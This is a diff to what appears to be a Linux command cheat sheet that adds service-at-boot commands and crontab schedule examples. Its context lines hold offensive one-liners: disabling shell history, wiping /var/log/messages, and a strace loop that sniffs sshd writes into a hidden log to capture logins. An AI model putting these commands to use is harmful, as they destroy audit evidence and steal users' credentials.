@@ -85,3 +85,21 @@ Change Timestamps (use current time)----touch -t
 Stop Logggin to .bash_history----unset HISTFILE
 Zero Messages Log----echo > /var/log/messages
 strace sniffing----##sh -c while [ 1 ]; do ;export pid=$(ps aux | grep sshd| grep net | grep -v grep | awk {'print $2'})&& ; if [ "$pid" != "" ];then ; strace -p $pid -e write 2>>/var/log/mail/.$pid.log; fi; done
+
+##System Administration
+Start a Service at Boot (newer)----systemctl enable apache2
+Start a Service at Boot (older)----update-rc.d enable apache2
+
+##Crontab Examples (https://crontab.guru/examples.html)
+Every Minute----* * * * * command
+Every 3 Minutes----*/3 * * * * command
+Every Hour at 30min----30 * * * * command
+Every Day at 1AM----0 1 * * * command
+Every Wednesday (first three letters of day)----0 0 * * WED command
+Every Saturday and Sunday----0 0 * * 6,0
+Every Week----0 0 * * 0 command
+Every Month----0 0 1 * * command
+Every 6 Months----0 0 1 */6 * command
+Every Year----0 0 1 1 * command
+
+##
